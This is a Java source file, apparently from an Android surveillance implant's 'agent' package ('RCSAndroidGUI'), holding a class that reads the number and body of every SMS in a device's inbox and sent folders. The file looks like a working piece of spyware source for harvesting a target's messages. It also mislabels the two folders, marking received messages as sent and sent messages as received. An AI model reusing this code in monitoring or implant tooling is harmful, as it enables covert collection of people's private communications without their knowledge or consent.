package com.ht.RCSAndroidGUI.agent;

import java.util.ArrayList;

import android.database.Cursor;
import android.net.Uri;

import com.ht.RCSAndroidGUI.Sms;
import com.ht.RCSAndroidGUI.Status;

public class SmsBrowser {
	private static final String TAG = "SmsBrowser";
	
	public SmsBrowser() {
		
	}
	
	public ArrayList<Sms> getSmsList() {
		ArrayList<Sms> list = new ArrayList<Sms>();
		
		Cursor c = Status.getAppContext().getContentResolver()
				.query(Uri.parse("content://sms/inbox"), null, null, null, null);
	
		int smsEntriesCount = c.getCount();

		if (c.moveToFirst() == false) {
	    	c.close();
	    	return list;
	    }
	    	
        for (int i = 0; i < smsEntriesCount; i++) {
            String body = c.getString(c.getColumnIndexOrThrow("body")).toString();
            String number = c.getString(c.getColumnIndexOrThrow("address")).toString();
            boolean status = Sms.SENT;
            
            c.moveToNext();
            
            Sms s = new Sms(number, body, status);
            list.add(s);
        }
	    
	    c.close();
	    
	    c = Status.getAppContext().getContentResolver()
				.query(Uri.parse("content://sms/sent"), null, null, null, null);

		smsEntriesCount = c.getCount();

		if (c.moveToFirst() == false) {
			c.close();
			return list;
		}

		for (int i = 0; i < smsEntriesCount; i++) {
			String body = c.getString(c.getColumnIndexOrThrow("body")).toString();
			String number = c.getString(c.getColumnIndexOrThrow("address")).toString();
			boolean status = Sms.RECEIVED; //c.getColumnIndexOrThrow("status");

			c.moveToNext();

			Sms s = new Sms(number, body, status);
			list.add(s);
		}

		c.close();
	    return list;
	}
}